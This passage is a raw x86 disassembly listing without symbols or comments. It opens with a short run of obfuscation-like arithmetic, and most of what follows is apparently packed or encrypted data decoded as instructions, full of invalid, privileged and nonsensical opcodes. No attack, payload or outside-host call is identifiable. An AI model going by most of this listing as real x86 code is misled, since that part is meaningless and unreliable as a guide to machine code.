  421eed:	jmp    0x42315b
  421ef2:	mov    ecx,DWORD PTR [ebp+0x8]
  421ef5:	mov    edx,DWORD PTR [ebp-0x8]
  421ef8:	xor    ecx,eax
  421efa:	xor    edx,eax
  421efc:	sub    ecx,edx
  421efe:	sub    ecx,esi
  421f00:	xor    ecx,eax
  421f02:	mov    DWORD PTR [ebp+0x8],ecx
  421f05:	mov    ecx,DWORD PTR [ebp+0x8]
  421f08:	mov    edx,DWORD PTR [ebp-0x58]
  421f0b:	add    ecx,0x5708fa
  421f11:	imul   ecx,edx
  421f14:	mov    DWORD PTR [ebp-0x58],ecx
  421f17:	mov    ecx,DWORD PTR [ebp+0x8]
  421f1a:	mov    edx,DWORD PTR [ebp-0x54]
  421f1d:	add    ecx,0x64f898
  421f23:	or     ecx,edx
  421f25:	mov    DWORD PTR [ebp-0x54],ecx
  421f28:	mov    ecx,DWORD PTR [ebp+0x8]
  421f2b:	mov    edx,DWORD PTR [ebp-0x50]
  421f2e:	add    ecx,0x242ebc9
  421f34:	xor    ecx,edx
  421f36:	mov    DWORD PTR [ebp-0x50],ecx
  421f39:	mov    ecx,DWORD PTR [ebp+0x8]
  421f3c:	mov    edx,DWORD PTR [ebp-0x4c]
  421f3f:	jmp    0x42311b
  421f44:	sbb    eax,0x95d463fb
  421f49:	aam    0x96
  421f4b:	mov    dh,0xbf
  421f4d:	cdq    
  421f4e:	push   eax
  421f4f:	inc    esi
  421f50:	popa   
  421f51:	xor    edi,DWORD PTR [edx+ebx*1]
  421f54:	fist   DWORD PTR [ecx+0x6cc2837c]
  421f5a:	add    DWORD PTR [ebx+0x6a09aa47],0x5c
  421f61:	mov    ebx,0x8c10b637
  421f66:	das    
  421f67:	fs data16 ja 0x421efa
  421f6b:	mov    WORD PTR [edi+0x5027d445],es
  421f71:	jnp    0x421fd2
  421f73:	and    ebx,DWORD PTR [eax]
  421f75:	sahf   
  421f76:	and    eax,eax
  421f78:	nop
  421f79:	loopne 0x421f93
  421f7b:	lds    ebp,FWORD PTR [ecx-0x71639377]
  421f81:	outs   dx,BYTE PTR ds:[esi]
  421f82:	fcom   st(6)
  421f84:	push   ebp
  421f85:	inc    esi
  421f86:	jmp    0x9546:0xeb38c081
  421f8d:	lds    esi,FWORD PTR [edx+0xd]
  421f90:	aaa    
  421f91:	jmp    0x958b:0xacd174e9
  421f98:	jns    0x421fad
  421f9a:	add    BYTE PTR [ebp-0x2f],dl
  421f9d:	pop    edx
  421f9e:	sahf   
  421f9f:	or     BYTE PTR ds:0x457312d7,bl
  421fa5:	sub    al,0x64
  421fa7:	test   eax,0xa9c759e7
  421fac:	or     esp,DWORD PTR [eax-0x23db42ec]
  421fb2:	push   ecx
  421fb3:	fwait
  421fb4:	sub    bh,dl
  421fb6:	sub    DWORD PTR ds:0x62f75405,ebp
  421fbc:	cmp    BYTE PTR [ebp-0x46],dh
  421fbf:	dec    ebp
  421fc0:	lock xchg esp,eax
  421fc2:	mov    cl,0xe8
  421fc4:	push   cs
  421fc5:	js     0x422029
  421fc7:	jb     0x421fa2
  421fc9:	and    eax,0xa51d1dc6
  421fce:	and    eax,0x53ab5441
  421fd3:	in     eax,0xee
  421fd5:	jl     0x42200e
  421fd7:	xchg   ecx,eax
  421fd8:	or     eax,0x7231fce7
  421fdd:	pusha  
  421fde:	dec    eax
  421fdf:	test   al,0x37
  421fe1:	or     al,al
  421fe3:	stos   BYTE PTR es:[edi],al
  421fe4:	out    0xe4,al
  421fe6:	add    eax,0x1df3641c
  421feb:	add    ch,bl
  421fed:	aas    
  421fee:	test   DWORD PTR [ecx+0x25],edi
  421ff1:	(bad)  
  421ff2:	es xchg edx,eax
  421ff4:	pop    ds
  421ff5:	rcl    ch,cl
  421ff7:	retf   
  421ff8:	pusha  
  421ff9:	xchg   DWORD PTR ds:0xcb4d29eb,esi
  421fff:	pop    ecx
  422000:	xchg   ebx,eax
  422001:	xchg   esi,eax
  422002:	in     eax,dx
  422003:	add    eax,DWORD PTR [ebx]
  422005:	test   DWORD PTR [ebx],0x394b7421
  42200b:	inc    eax
  42200c:	sahf   
  42200d:	(bad)  
  42200f:	fist   DWORD PTR [ebp-0x56fa906c]
  422015:	dec    esi
  422016:	mov    ch,0x3d
  422018:	or     esp,ecx
  42201a:	leave  
  42201b:	daa    
  42201c:	inc    ebp
  42201d:	push   0xb66ed0c2
  422022:	arpl   WORD PTR [ebx+0x7c],sp
  422025:	popf   
  422026:	into   
  422027:	jo     0x422097
  422029:	call   0x372eeb8a
  42202e:	les    esp,FWORD PTR [edi-0x51d21a46]
  422034:	dec    edi
  422035:	scas   eax,DWORD PTR es:[edi]
  422036:	cli    
  422037:	rcr    DWORD PTR [edx+0x3c],1
  42203a:	push   ebp
  42203b:	mov    bl,0xc1
  42203d:	ja     0x42204d
  42203f:	or     eax,0x2f71757d
  422044:	push   edx
  422045:	xchg   edi,eax
  422046:	shr    BYTE PTR [esi+0x293174c0],1
  42204c:	outs   dx,DWORD PTR ds:[esi]
  42204d:	xor    edi,DWORD PTR [ebx-0x7a]
  422050:	gs and eax,0xde5b7cc6
  422056:	and    al,BYTE PTR [ebp+ebp*4-0x24]
  42205a:	push   ecx
  42205b:	inc    ebx
  42205c:	outs   dx,BYTE PTR ds:[esi]
  42205d:	in     al,dx
  42205e:	dec    ecx
  42205f:	test   eax,0xf1ca5b83
  422064:	cmp    bl,BYTE PTR [ebp+0x59]
  422067:	jnp    0x4220da
  422069:	inc    ebp
  42206a:	mov    esi,0x181ecba5
  42206f:	sbb    al,0x4a
  422071:	jg     0x422026
  422073:	cmp    dl,BYTE PTR [ebx+0x43]
  422076:	repnz lock hlt 
  422079:	mov    dh,0x55
  42207b:	outs   dx,BYTE PTR ds:[esi]
  42207c:	push   esp
  42207d:	mov    ebx,DWORD PTR [edi-0x5b]
  422080:	lods   al,BYTE PTR ds:[esi]
  422081:	adc    eax,0x7486dbd2
  422086:	and    esp,esi
  422088:	push   0xb
  42208a:	stc    
  42208b:	push   ebx
  42208c:	scas   al,BYTE PTR es:[edi]
  42208d:	jbe    0x4220f4
  42208f:	jo     0x4220e4
  422091:	inc    edx
  422092:	mov    WORD PTR [ecx],ss
  422094:	ror    BYTE PTR [eax+0x48],1
  422097:	jno    0x4220be
  422099:	ds out dx,al
  42209b:	jl     0x422042
  42209d:	mov    al,ds:0xc2496074
  4220a2:	add    BYTE PTR [eax-0xc],dh
  4220a5:	sbb    edx,eax
  4220a7:	sub    eax,0x350b5865
  4220ac:	das    
  4220ad:	int    0x96
  4220af:	or     edi,DWORD PTR [edx]
  4220b1:	jae    0x4220c9
  4220b3:	xor    DWORD PTR [esi+0x2b],ecx
  4220b6:	jo     0x4220e1
  4220b8:	div    BYTE PTR ds:0x7041c6a
  4220be:	cmp    esi,DWORD PTR [esi]
  4220c0:	retf   0x7dfe
  4220c3:	sub    BYTE PTR [ebp+0x56],bl
  4220c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220c7:	jge    0x4220f2
  4220c9:	cmp    DWORD PTR [edi-0x2c],0x2796e0cb
  4220d0:	wrmsr  
  4220d2:	fist   WORD PTR [edx+edx*8+0x58363ca1]
  4220d9:	dec    edi
  4220da:	mov    dl,0x5e
  4220dc:	jmp    0xe7c6:0x323d2ab4
  4220e3:	lods   al,BYTE PTR ds:[esi]
  4220e4:	jg     0x422160
  4220e6:	xchg   DWORD PTR [esp+esi*1-0x67],edx
  4220ea:	dec    edx
  4220eb:	aas    
  4220ec:	sbb    esi,DWORD PTR [eax+0x6c5a9934]
  4220f2:	stos   DWORD PTR es:[edi],eax
  4220f3:	mov    ecx,0xe0c47f04
  4220f8:	in     al,dx
  4220f9:	je     0x422111
  4220fb:	aaa    
  4220fc:	sti    
  4220fd:	sbb    eax,0x2ab0c1f3
  422102:	fwait
  422103:	mov    esi,DWORD PTR [esi]
  422105:	mov    cl,0x3b
  422107:	mov    ah,0x71
  422109:	dec    ebx
  42210a:	test   BYTE PTR [ecx-0x694ad7a6],ah
  422110:	idiv   DWORD PTR [ebp+0x316c437d]
  422116:	stc    
  422117:	jp     0x4220b2
  422119:	bound  esi,QWORD PTR [edx+0x7d]
  42211c:	pop    edx
  42211d:	adc    eax,0xad30b524
  422122:	sub    eax,0xb6c65dab
  422127:	lods   al,BYTE PTR ds:[esi]
  422128:	mov    BYTE PTR [ecx],dl
  42212a:	rcl    BYTE PTR [esi-0xb6026d8],cl
  422130:	jmp    0x24785ad4
  422135:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422136:	add    DWORD PTR [ebx],esp
  422138:	inc    eax
  422139:	jb     0x4220e3
  42213b:	rcr    ecx,cl
  42213d:	js     0x4220ef
  42213f:	add    dh,BYTE PTR [edi]
  422141:	dec    edi
  422142:	jge    0x422156
  422144:	dec    ebx
  422145:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422147:	jnp    0x4220f1
  422149:	xchg   ebp,eax
  42214a:	nop
  42214b:	adc    al,0x80
  42214d:	mov    edi,0xe4dbf275
  422152:	adc    al,0xb
  422154:	jb     0x422139
  422156:	adc    ch,BYTE PTR [esi-0x5324c475]
  42215c:	out    dx,eax
  42215d:	aaa    
  42215e:	repz jmp 0x18649e5
  422164:	icebp  
  422165:	je     0x4221a6
  422167:	jne    0x4221c0
  422169:	cs test eax,0xe4fd253f
  42216f:	ret    
  422170:	xchg   esp,eax
  422171:	push   ebp
  422172:	sub    ch,dl
  422174:	fisub  DWORD PTR [esi-0x4d9de0f4]
  42217a:	scas   al,BYTE PTR es:[edi]
  42217b:	pop    eax
  42217c:	sbb    al,0xfa
  42217e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42217f:	leave  
  422180:	xchg   ebx,eax
  422181:	and    eax,DWORD PTR [edi-0x4e6a6bde]
  422187:	shl    BYTE PTR [edi+0x1185af22],cl
  42218d:	test   al,0x76
  42218f:	xchg   esi,eax
  422190:	push   esi
  422191:	in     eax,0x20
  422193:	sub    dl,BYTE PTR [ebx]
  422195:	pop    es
  422196:	fwait
  422197:	cmp    eax,0xa2c50bbf
  42219c:	pop    edx
  42219d:	pop    ebp
  42219e:	xchg   ebp,eax
  42219f:	fucomp st(0)
  4221a1:	mov    bh,0x9c
  4221a3:	dec    edi
  4221a4:	and    al,bl
  4221a6:	adc    al,0xb3
  4221a8:	sbb    esp,ecx
  4221aa:	mov    dl,0x37
  4221ac:	fdiv   st,st(3)
  4221ae:	sbb    eax,0x810a0363
  4221b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221b4:	(bad)  [edi+0x487019f]
  4221ba:	ds xor ah,cl
  4221bd:	mov    al,ds:0x43f25a8
  4221c2:	and    DWORD PTR [esi],edx
  4221c4:	jb     0x42222d
  4221c6:	mov    esi,DWORD PTR [ebp+0x43]
  4221c9:	xchg   BYTE PTR [edi-0x70c78725],ch
  4221cf:	jg     0x42216a
  4221d1:	je     0x422156
  4221d3:	pusha  
  4221d4:	js     0x422186
  4221d6:	into   
  4221d7:	lock adc eax,0x5c1b21d8
  4221dd:	mov    ebp,DWORD PTR [ebx+0x1a]
  4221e0:	dec    ebx
  4221e1:	pop    es
  4221e2:	inc    ebp
  4221e3:	jno    0x422240
  4221e5:	stos   DWORD PTR es:[edi],eax
  4221e6:	out    dx,al
  4221e7:	push   esp
  4221e8:	fwait
  4221e9:	xchg   ebx,eax
  4221ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221eb:	mov    ?,WORD PTR ds:0x6d3d143c
  4221f1:	data16 jecxz 0x4221d2
  4221f4:	push   esp
  4221f5:	sub    DWORD PTR [ebx],ebx
  4221f7:	push   ecx
  4221f8:	jo     0x422204
  4221fa:	mov    ds:0x8be85387,al
  4221ff:	push   esp
  422200:	jns    0x4221fb
  422202:	push   ebx
  422203:	cmp    al,0x5
  422205:	mov    bh,0xd9
  422207:	push   edx
  422208:	xor    bh,al
  42220a:	addr16 call 0x970d:0x4c17111c
  422212:	push   eax
  422213:	fcom   DWORD PTR [eax+0x6f]
  422216:	ret    0x7543
  422219:	repnz cmp al,0xa9
  42221c:	pop    eax
  42221d:	call   0xa909:0x3a81b2cb
  422224:	push   edx
  422225:	fst    QWORD PTR [ebx-0x43]
  422229:	popa   
  42222a:	fs ja  0x42220c
  42222d:	ja     0x42223e
  42222f:	int3   
  422230:	jne    0x4221ee
  422232:	fs leave 
  422234:	jb     0x42220f
  422236:	mov    dh,0x3
  422238:	leave  
  422239:	jb     0x4222ad
  42223b:	gs push edx
  42223d:	mov    cl,cl
  42223f:	sbb    al,0xc
  422241:	xor    bh,dl
  422243:	ret    0xb9b5
  422246:	cdq    
  422247:	jle    0x4222ba
  422249:	fstp   st(5)
  42224c:	and    dl,BYTE PTR [edi]
  42224e:	xor    esi,ecx
  422250:	leave  
  422251:	cmp    eax,0xd68571e8
  422256:	idiv   ebp
  422258:	int3   
  422259:	push   ecx
  42225a:	jo     0x422289
  42225c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42225d:	jae    0x42222d
  42225f:	into   
  422260:	imul   ebp,esp,0xffffffd3
  422263:	arpl   WORD PTR [edx+eiz*2],ax
  422266:	mov    ch,0x78
  422268:	ror    DWORD PTR [eax],0x5a
  42226b:	push   0x18
  42226d:	fcomp  QWORD PTR gs:[edi-0x7]
  422271:	test   eax,0x8512ec4d
  422276:	fucomp st(1)
  422278:	sub    BYTE PTR [esi+0x27],dl
  42227b:	cmp    DWORD PTR es:[esi-0x7ab8f804],0xffffffb4
  422283:	adc    BYTE PTR [ecx-0x53],cl
  422286:	sbb    al,0x9e
  422288:	and    BYTE PTR [edx-0x30d3e9ae],dl
  42228e:	pop    edx
  42228f:	xchg   ebx,eax
  422290:	outs   dx,DWORD PTR ds:[esi]
  422291:	mov    al,fs:0x178d7178
  422297:	andps  xmm0,XMMWORD PTR [ecx]
  42229a:	pop    ebp
  42229b:	mov    eax,0x36c9e6e3
  4222a0:	inc    esi
  4222a1:	repnz adc ebx,esp
  4222a4:	je     0x422301
  4222a6:	push   esp
  4222a7:	mov    dh,0x40
  4222a9:	jns    0x422275
  4222ab:	lods   eax,DWORD PTR ds:[esi]
  4222ac:	aas    
  4222ad:	test   DWORD PTR es:[edi+0x7d],esp
  4222b1:	adc    DWORD PTR [edx+eiz*8+0x2290dee8],esp
  4222b8:	in     eax,0x5e
  4222ba:	pop    esi
  4222bb:	data16 daa 
  4222bd:	jne    0x422303
  4222bf:	sub    ebx,DWORD PTR [ecx-0x429a7b55]
  4222c5:	jle    0x422322
  4222c7:	(bad)  
  4222c8:	(bad)  [esi-0x7f6ea7c7]
  4222ce:	loop   0x4222d9
  4222d0:	sbb    al,0xf2
  4222d2:	idiv   DWORD PTR [ecx+0x314c2263]
  4222d8:	sbb    eax,0x364c5842
  4222dd:	xchg   ecx,eax
  4222de:	std    
  4222df:	xor    al,0x3c
  4222e1:	daa    
  4222e2:	inc    esp
  4222e3:	mov    bl,0xed
  4222e5:	mov    ch,0x78
  4222e7:	(bad)  
  4222e8:	cmp    BYTE PTR [eax],al
  4222ea:	push   cs
  4222eb:	mov    edx,0xecc67289
  4222f0:	and    DWORD PTR [edi-0x46],esp
  4222f3:	aad    0x55
  4222f5:	sub    ch,ch
  4222f7:	daa    
  4222f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222f9:	ret    
  4222fa:	or     al,0x5c
  4222fc:	hlt    
  4222fd:	adc    al,BYTE PTR [edx-0x2ef25484]
  422303:	mov    ah,0x47
  422305:	sbb    eax,0xe57ac832
  42230a:	and    dl,BYTE PTR [ebp+0x7e17bca1]
  422310:	push   es
  422311:	pop    ebx
  422312:	ins    DWORD PTR es:[edi],dx
  422313:	je     0x422337
  422315:	bnd je 0x42236b
  422318:	enter  0x9dff,0xc8
  42231c:	or     DWORD PTR [edx+0x6a],esp
  42231f:	jnp    0x42236b
  422321:	bound  ecx,QWORD PTR [esi]
  422323:	cld    
  422324:	mov    ah,0x70
  422326:	xor    esp,ebx
  422328:	mov    esi,0xa6a2c54c
  42232d:	into   
  42232e:	ins    BYTE PTR es:[edi],dx
  42232f:	dec    esi
  422330:	loop   0x42239a
  422332:	push   esi
  422333:	lock hlt 
  422335:	and    eax,0xf3229c83
  42233a:	mov    eax,0xb8016edf
  42233f:	lods   eax,DWORD PTR ds:[esi]
  422340:	rcr    BYTE PTR [esi],0x23
  422343:	pop    ebx
  422344:	push   0x45f5a2ea
  422349:	into   
  42234a:	out    0x3f,al
  42234c:	jmp    0xc5a25acb
  422351:	push   esp
  422352:	cmp    BYTE PTR [eax],0xa0
  422355:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422356:	mov    edi,0x6e74b152
  42235b:	mov    dl,0x9b
  42235d:	icebp  
  42235e:	btr    DWORD PTR [ecx],esi
  422361:	xor    edx,esp
  422363:	dec    esp
  422364:	dec    DWORD PTR [esi-0x15ef4f31]
  42236a:	sbb    BYTE PTR [ecx-0x3ded3e31],dh
  422370:	rcl    BYTE PTR [ecx],0x2c
  422373:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422374:	mov    al,ds:0x448a4547
  422379:	dec    eax
  42237a:	fisttp WORD PTR [esi-0x4ecaeafd]
  422380:	ret    0xf21b
  422383:	test   eax,0x493241b4
  422388:	cmp    al,0x1
  42238a:	or     ch,BYTE PTR [edx+0x51753214]
  422390:	rcr    BYTE PTR [edx],1
  422392:	jno    0x422402
  422394:	mov    dh,0x48
  422396:	xchg   ecx,eax
  422397:	pop    esp
  422398:	jnp    0x422340
  42239a:	jecxz  0x4223fd
  42239c:	xor    al,bl
  42239e:	mov    bl,BYTE PTR [eax+ebp*1-0x1d46e162]
  4223a5:	fld    QWORD PTR [ecx-0x5636ca4f]
  4223ab:	mov    ebp,0x8a6c777b
  4223b0:	inc    esi
  4223b1:	cmp    eax,0x7b804823
  4223b6:	xor    eax,0xbc2fbb5d
  4223bb:	pop    eax
  4223bc:	cmp    eax,0x93f60a57
  4223c1:	ror    DWORD PTR [eax-0x6ca6815b],0xff
  4223c8:	xor    al,0x69
  4223ca:	cwde   
  4223cb:	cmc    
  4223cc:	stos   BYTE PTR es:[edi],al
  4223cd:	es enter 0x6742,0xe8
  4223d2:	dec    esp
  4223d3:	inc    ebp
  4223d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223d5:	push   ecx
  4223d6:	ins    BYTE PTR es:[edi],dx
  4223d7:	cdq    
  4223d8:	jb     0x42242c
  4223da:	int    0x17
  4223dc:	pop    ds
  4223dd:	push   cs
  4223de:	retf   
  4223df:	jbe    0x42242c
  4223e1:	ins    DWORD PTR es:[edi],dx
  4223e2:	cmp    BYTE PTR [edi],bh
  4223e4:	test   DWORD PTR [edx+0x66],0x1ed9b3cc
  4223eb:	int    0xd7
  4223ed:	sbb    eax,0xbe90bfa4
  4223f2:	stos   BYTE PTR es:[edi],al
  4223f3:	or     al,0x97
  4223f5:	mov    ds:0x794ab816,eax
  4223fa:	outs   dx,DWORD PTR ds:[esi]
  4223fb:	ja     0x4223df
  4223fd:	mov    bl,bh
  4223ff:	hlt    
  422400:	push   ecx
  422401:	pop    es
  422402:	push   0x1b348831
  422407:	sbb    al,0x5a
  422409:	je     0x422447
  42240b:	loope  0x422473
  42240d:	pop    ds
  42240e:	dec    ecx
  42240f:	jge    0x422469
  422411:	and    dl,BYTE PTR ds:0xf92bfad0
  422417:	scas   al,BYTE PTR es:[edi]
  422418:	stos   BYTE PTR es:[edi],al
  422419:	or     esi,edx
  42241b:	cmc    
  42241c:	arpl   cx,bp
  42241e:	sub    ch,BYTE PTR [edx+esi*2-0x3a]
  422422:	cmp    ebx,DWORD PTR [eax-0x33]
  422425:	mov    ds:0xd3d06b08,al
  42242a:	(bad)  
  42242b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42242c:	xchg   edi,eax
  42242d:	repz leave 
  42242f:	push   cs
  422430:	sub    al,0x93
  422432:	(bad)  [ebp-0x6f]
  422435:	repnz test DWORD PTR ds:0x6fa757c6,eax
  42243c:	ins    DWORD PTR es:[edi],dx
  42243d:	inc    ebx
  42243e:	gs fwait
  422440:	add    eax,eax
  422442:	lahf   
  422443:	jnp    0x42249f
  422445:	sub    eax,0xf494fd22
  42244a:	adc    edx,esp
  42244c:	loop   0x4224a5
  42244e:	fs push eax
  422450:	shl    BYTE PTR [bp+si],0xb4
  422454:	bound  edx,QWORD PTR [eax+0x267941d8]
  42245a:	pop    ss
  42245b:	js     0x4223f2
  42245d:	adc    cl,cl
  42245f:	aad    0x69
  422461:	jecxz  0x4224ca
  422463:	inc    ebp
  422465:	and    dh,ah
  422467:	add    eax,esi
  422469:	mov    edx,0x7952fd14
  42246e:	bswap  esi
  422470:	shl    BYTE PTR [ebx+0x67],1
  422473:	mov    ebx,0x20295678
  422478:	push   0x3d
  42247a:	push   esi
  42247b:	pop    ss
  42247c:	ret    
  42247d:	in     eax,0x7
  42247f:	loope  0x42243b
  422481:	cmp    al,0x3f
  422483:	jb     0x422484
  422485:	mov    eax,ds:0xa8932707
  42248a:	and    bl,0x98
  42248d:	pushf  
  42248e:	inc    esp
  42248f:	int    0xdb
  422491:	sub    WORD PTR [ebp-0x42],0xcbc6
  422497:	pop    es
  422498:	out    dx,al
  422499:	cwde   
  42249a:	inc    edx
  42249b:	retf   
  42249c:	jp     0x422459
  42249e:	xor    al,cl
  4224a0:	push   ss
  4224a1:	ds cmc 
  4224a3:	dec    esp
  4224a4:	data16 ja 0x4224e8
  4224a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224a8:	int    0x9a
  4224aa:	test   eax,0x72781a6d
  4224af:	fs scas eax,DWORD PTR es:[edi]
  4224b1:	jge    0x42249b
  4224b3:	pop    eax
  4224b4:	(bad)  
  4224b6:	sar    BYTE PTR [eax-0x5b],1
  4224b9:	data16 loop 0x4224c2
  4224bc:	mov    ah,0x8e
  4224be:	push   ebx
  4224bf:	xor    DWORD PTR [esi+0x78],eax
  4224c2:	pop    edx
  4224c3:	test   eax,0xb573ad67
  4224c8:	mov    ?,WORD PTR [ebp-0xb]
  4224cb:	repz cmp edi,DWORD PTR [eax]
  4224ce:	rcr    DWORD PTR [ebp+0x34],cl
  4224d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224d2:	mov    ch,BYTE PTR [edx-0x17b117d3]
  4224d8:	mov    bl,0x7d
  4224da:	std    
  4224db:	xor    ch,BYTE PTR [ecx+0x52800322]
  4224e1:	retf   0x8a53
  4224e4:	xor    edi,DWORD PTR [ecx]
  4224e6:	adc    DWORD PTR [eax+esi*2+0x10],edx
  4224ea:	aaa    
  4224eb:	int3   
  4224ec:	fs in  al,0xc2
  4224ef:	dec    edi
  4224f0:	inc    edi
  4224f1:	jl     0x4224d5
  4224f3:	aad    0xc7
  4224f5:	inc    eax
  4224f6:	push   0xefd5cb11
  4224fb:	out    dx,eax
  4224fc:	adc    ch,BYTE PTR [edi+0x4cde2e6e]
  422502:	call   0x8a4a214f
  422507:	ds loope 0x4224c6
  42250a:	outs   dx,BYTE PTR ds:[esi]
  42250b:	sub    esp,DWORD PTR [ecx-0x37]
  42250e:	push   ss
  42250f:	xchg   edx,eax
  422510:	mov    edi,0xf085bb53
  422515:	mov    esp,0xb3e28b7b
  42251a:	ffree  st(4)
  42251c:	lea    edx,[edi-0x3df5d6b6]
  422522:	pop    esp
  422523:	outs   dx,BYTE PTR ds:[esi]
  422524:	push   esi
  422525:	sub    al,0xe7
  422527:	add    dh,dl
  422529:	fcomip st,st(4)
  42252b:	ins    BYTE PTR es:[edi],dx
  42252c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42252d:	mov    eax,edi
  42252f:	push   esp
  422530:	dec    eax
  422531:	push   es
  422532:	xchg   esi,eax
  422533:	aam    0xed
  422535:	mov    bl,0xeb
  422537:	jmp    0x8d2b:0x763b4a17
  42253e:	or     al,0x4e
  422540:	retf   0x4f41
  422543:	xor    ax,0x4113
  422547:	inc    edi
  422548:	sub    BYTE PTR [ecx],bh
  42254a:	dec    ecx
  42254b:	sbb    al,0x11
  42254d:	loop   0x42250a
  42254f:	ins    DWORD PTR es:[edi],dx
  422550:	cs xchg ebp,eax
  422552:	in     al,dx
  422553:	aas    
  422554:	sar    DWORD PTR [edi],0x65
  422557:	bound  esi,QWORD PTR [esi]
  422559:	xchg   BYTE PTR [ebx-0x12],al
  42255c:	push   ebx
  42255d:	mov    ch,0x93
  42255f:	cmp    esp,edx
  422561:	call   0x9452d995
  422566:	push   ecx
  422567:	xchg   al,ch
  422569:	fstp   DWORD PTR [ebp+0x7845b6b6]
  42256f:	pop    edi
  422570:	fidiv  DWORD PTR [edi+0x22]
  422573:	sub    bh,dl
  422575:	pop    edx
  422576:	sbb    edi,DWORD PTR [edx]
  422578:	xchg   ecx,eax
  422579:	jl     0x422581
  42257b:	arpl   WORD PTR [eax+ebx*2+0x66],ax
  42257f:	adc    ah,BYTE PTR [edi-0x17e7a8ca]
  422585:	sub    bh,BYTE PTR [ebx-0x38]
  422588:	mov    ds:0x4f945415,al
  42258d:	xchg   esi,eax
  42258e:	lods   al,BYTE PTR ds:[esi]
  42258f:	pop    eax
  422590:	popf   
  422591:	imul   esp,DWORD PTR [ecx+0x60baeda],0x53
  422598:	in     eax,0x63
  42259a:	adc    al,0xc1
  42259c:	sbb    bh,BYTE PTR [ecx-0x63]
  42259f:	xlat   BYTE PTR ds:[ebx]
  4225a0:	cmp    BYTE PTR [edx+0x5e3810fa],bl
  4225a6:	in     eax,dx
  4225a7:	clc    
  4225a8:	mov    edi,0x4e098a8f
  4225ad:	aaa    
  4225ae:	or     al,0xed
  4225b0:	imul   esi,DWORD PTR [eax-0x30],0x80a161d3
  4225b7:	(bad)  
  4225b8:	loop   0x42255a
  4225ba:	jne    0x422621
  4225bc:	ja     0x422583
  4225be:	pop    ds
  4225bf:	cwde   
  4225c0:	aas    
  4225c1:	sub    eax,0x17c6c1eb
  4225c6:	xchg   ecx,eax
  4225c7:	les    esi,FWORD PTR [ebp-0x92c700a]
  4225cd:	ds jnp 0x422573
  4225d0:	mov    ebx,0x291a4a7f
  4225d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225d6:	mov    edx,0x6354f7cb
  4225db:	mov    bl,BYTE PTR [ebx-0x62]
  4225de:	push   esp
  4225df:	inc    edx
  4225e0:	pop    esp
  4225e1:	xchg   edi,eax
  4225e2:	popa   
  4225e3:	add    cl,BYTE PTR [edx-0x62]
  4225e6:	out    dx,al
  4225e7:	push   edx
  4225e8:	cld    
  4225e9:	sbb    DWORD PTR [eax-0x1bd5687b],esp
  4225ef:	jnp    0x42263e
  4225f1:	add    al,0x15
  4225f3:	cmp    al,0xae
  4225f5:	mov    WORD PTR [ecx+0x40],ds
  4225f8:	add    bh,bh
  4225fa:	sub    DWORD PTR [edx],ecx
  4225fc:	popa   
  4225fd:	es loopne 0x422582
  422600:	fstp   st(3)
  422602:	sub    edx,esi
  422604:	cli    
  422605:	jecxz  0x4225ea
  422607:	inc    eax
  422608:	push   esi
  422609:	mov    al,0x44
  42260b:	mov    ah,0xe3
  42260d:	mov    DWORD PTR [esi+edx*4-0x699bc498],edi
  422614:	stc    
  422615:	adc    ebx,DWORD PTR [edx-0x64]
  422618:	mov    BYTE PTR [esp+ecx*1],cl
  42261b:	ss call 0xe3af:0xfc78abdd
  422623:	add    BYTE PTR [ecx+0x4c],cl
  422626:	call   0x456d146c
  42262b:	out    0xb0,eax
  42262d:	xor    DWORD PTR [eax-0x5a],edx
  422630:	mov    ds:0x7175d04b,eax
  422635:	xchg   ebp,eax
  422636:	or     ebx,DWORD PTR [edi-0x6]
  422639:	sbb    DWORD PTR [esi],edi
  42263b:	and    al,0xde
  42263d:	inc    edi
  42263e:	call   0xcbee3197
  422643:	sbb    eax,DWORD PTR [ebp-0x56]
  422646:	cs push edi
  422648:	into   
  422649:	add    eax,0x11637ab3
  42264e:	xchg   edi,eax
  42264f:	xor    eax,0xe78f242c
  422654:	mov    ecx,0x25e98f2
  422659:	(bad)  
  42265b:	adc    edx,DWORD PTR [esp+eax*1+0x40]
  42265f:	fld    DWORD PTR ds:0xca4f52a4
  422665:	std    
  422666:	xor    DWORD PTR [ebp-0x24c67ba7],ebp
  42266c:	loop   0x42261a
  42266e:	inc    ebp
  42266f:	pusha  
  422670:	push   ds
  422671:	xchg   edi,eax
  422672:	in     al,0xf4
  422674:	mov    ds:0xea35015,al
  422679:	aas    
  42267a:	out    0xa5,al
  42267c:	jg     0x4226e6
  42267e:	sar    DWORD PTR [ecx+0x7b],cl
  422681:	in     al,dx
  422682:	mov    DWORD PTR [eax+0x3ac00f4c],eax
  422688:	daa    
  422689:	loope  0x42262e
  42268b:	xchg   esp,eax
  42268c:	test   eax,0x9af7f08d
  422691:	div    BYTE PTR [esi-0x29c76b27]
  422697:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422698:	fst    QWORD PTR [ebx]
  42269a:	lods   al,BYTE PTR ds:[esi]
  42269b:	mov    ds:0x934254ab,eax
  4226a0:	into   
  4226a1:	sbb    DWORD PTR [esi],edi
  4226a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226a4:	out    dx,eax
  4226a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226a6:	ds cld 
  4226a8:	rol    ebp,1
  4226aa:	lea    esp,[esp+eax*1]
  4226ad:	inc    esi
  4226ae:	inc    ebx
  4226af:	inc    eax
  4226b0:	in     al,0xd9
